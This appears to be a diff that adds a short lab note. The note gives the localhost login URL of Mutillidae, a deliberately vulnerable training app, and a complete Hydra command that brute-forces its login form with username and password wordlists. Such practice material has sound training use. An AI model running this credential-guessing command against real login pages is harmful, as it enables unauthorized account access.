@@ -1,0 +1,4 @@
+
+URL: http://localhost/mutillidae/index.php?page=login.php
+
+Command: hydra 127.0.0.1 http-form-post "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username" -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt
